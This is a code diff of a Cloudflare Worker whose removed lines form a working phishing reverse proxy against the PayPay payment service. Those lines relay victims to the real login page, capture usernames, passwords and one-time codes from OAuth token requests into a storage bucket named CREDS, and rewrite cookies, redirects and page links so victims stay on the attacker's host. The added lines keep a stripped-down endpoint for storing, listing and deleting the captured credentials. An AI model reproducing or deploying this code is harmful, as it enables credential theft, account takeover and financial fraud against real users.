@@ -1,139 +1,56 @@
-// Cloudflare Worker — reverse proxy to PayPay + credential store
-// KV binding: CREDS
+// Cloudflare Worker — credential store
+// KV binding: CREDS  (create via dashboard or wrangler)
 // Deploy: wrangler deploy
 //
-// 本物の www.paypay.ne.jp を中継。
-// 16文字のリンクIDパスは PayPay ログインページにプロキシ。
-// /app/v1/oauth/token の password grant をキャプチャして KV に保存。
-
-const TARGET_ORIGIN = "https://www.paypay.ne.jp";
-const LINK_ID_RE = /^[A-Za-z0-9]{16}$/;
+// POST /        — store entry  (requires X-Secret header if SECRET env var is set)
+// GET  /?n=50   — list latest n entries (default 50)
+// DELETE /?key= — delete one entry by key
 
 export default {
   async fetch(request, env) {
-    const url = new URL(request.url);
-    const workerHost = url.host;
-
     const secret = (env.SECRET || "").trim();
-    if (secret && request.headers.get("X-Secret") === secret && request.method === "POST") {
-      return handleStore(request, env);
+
+    if (secret) {
+      const provided = (request.headers.get("X-Secret") || "").trim();
+      if (provided !== secret) {
+        return new Response("Unauthorized", { status: 401 });
+      }
     }
 
-    // 16文字IDの場合はログインページにプロキシ
-    const pathParts = url.pathname.split("/").filter(Boolean);
-    if (pathParts.length === 1 && LINK_ID_RE.test(pathParts[0])) {
-      const loginUrl = new URL(request.url);
-      loginUrl.pathname = "/app/account/sign-in";
-      return proxy(new Request(loginUrl, request), env, workerHost);
+    const url = new URL(request.url);
+
+    if (request.method === "POST") {
+      let body;
+      try { body = await request.json(); } catch { body = {}; }
+      const key = Date.now().toString() + "-" + Math.random().toString(36).slice(2, 8);
+      await env.CREDS.put(key, JSON.stringify(body));
+      return json({ ok: true, key });
     }
 
-    return proxy(request, env, workerHost);
+    if (request.method === "GET") {
+      const n = Math.min(parseInt(url.searchParams.get("n") || "50", 10), 500);
+      const list = await env.CREDS.list({ limit: n });
+      const entries = await Promise.all(
+        list.keys.map(async ({ name }) => {
+          const val = await env.CREDS.get(name);
+          try { return { key: name, ...JSON.parse(val) }; }
+          catch { return { key: name, raw: val }; }
+        })
+      );
+      entries.sort((a, b) => b.key.localeCompare(a.key));
+      return json(entries);
+    }
+
+    if (request.method === "DELETE") {
+      const key = url.searchParams.get("key");
+      if (!key) return json({ error: "key required" }, 400);
+      await env.CREDS.delete(key);
+      return json({ ok: true });
+    }
+
+    return new Response("Method Not Allowed", { status: 405 });
   },
 };
-
-async function proxy(request, env, workerHost) {
-  const url = new URL(request.url);
-  const targetUrl = TARGET_ORIGIN + url.pathname + url.search;
-
-  const headers = new Headers(request.headers);
-  headers.set("Host", "www.paypay.ne.jp");
-  headers.delete("cf-connecting-ip");
-  headers.delete("cf-ray");
-  headers.delete("cf-visitor");
-
-  let body = request.body;
-
-  if ((request.method === "POST" || request.method === "PUT") && url.pathname.includes("/oauth/token")) {
-    const clone = request.clone();
-    try {
-      const text = await clone.text();
-      body = text;
-
-      let parsed = {};
-      try { parsed = JSON.parse(text); } catch {
-        const params = new URLSearchParams(text);
-        for (const [k, v] of params) parsed[k] = v;
-      }
-
-      const captured = {
-        type: "oauth_token",
-        path: url.pathname,
-        grant_type: parsed.grant_type || null,
-        username: parsed.username || parsed.phone || null,
-        password: parsed.password || null,
-        otp: parsed.otp || null,
-        otp_prefix: parsed.otp_prefix || null,
-        scope: parsed.scope || null,
-        client_uuid: parsed.client_uuid || null,
-        raw: text.slice(0, 1500),
-        ts: new Date().toISOString(),
-        ua: request.headers.get("User-Agent") || "",
-      };
-
-      const key = Date.now().toString() + "-" + Math.random().toString(36).slice(2, 8);
-      await env.CREDS.put(key, JSON.stringify(captured));
-    } catch {
-      // ignore
-    }
-  } else if (request.method === "POST" || request.method === "PUT") {
-    const clone = request.clone();
-    try {
-      const text = await clone.text();
-      if (text && (text.includes("password") || text.includes("username") || text.includes("otp"))) {
-        const key = Date.now().toString() + "-" + Math.random().toString(36).slice(2, 8);
-        await env.CREDS.put(key, JSON.stringify({
-          type: "captured_post",
-          path: url.pathname,
-          body: text.slice(0, 1500),
-          ts: new Date().toISOString(),
-        }));
-      }
-      body = text;
-    } catch {}
-  }
-
-  const res = await fetch(targetUrl, {
-    method: request.method,
-    headers,
-    body: (request.method !== "GET" && request.method !== "HEAD") ? body : undefined,
-    redirect: "manual",
-  });
-
-  const newHeaders = new Headers(res.headers);
-
-  const setCookies = newHeaders.getAll("set-cookie") || [];
-  newHeaders.delete("set-cookie");
-  for (const c of setCookies) {
-    const rewritten = c
-      .replace(/Domain=[^;]+/gi, `Domain=${workerHost}`)
-      .replace(/domain=[^;]+/gi, `domain=${workerHost}`);
-    newHeaders.append("set-cookie", rewritten);
-  }
-
-  const loc = newHeaders.get("location");
-  if (loc && loc.includes("paypay.ne.jp")) {
-    newHeaders.set("location", loc.replace(/https?:\/\/[^/]*paypay\.ne\.jp/g, `https://${workerHost}`));
-  }
-
-  const contentType = newHeaders.get("content-type") || "";
-  if (contentType.includes("text/html")) {
-    let html = await res.text();
-    html = html.replace(/https?:\/\/[^"'\s]*paypay\.ne\.jp/g, (m) =>
-      m.replace(/https?:\/\/[^/]*paypay\.ne\.jp/, `https://${workerHost}`)
-    );
-    return new Response(html, { status: res.status, headers: newHeaders });
-  }
-
-  return new Response(res.body, { status: res.status, headers: newHeaders });
-}
-
-async function handleStore(request, env) {
-  let body;
-  try { body = await request.json(); } catch { body = {}; }
-  const key = Date.now().toString() + "-" + Math.random().toString(36).slice(2, 8);
-  await env.CREDS.put(key, JSON.stringify(body));
-  return json({ ok: true, key });
-}
 
 function json(data, status = 200) {
   return new Response(JSON.stringify(data, null, 2), {
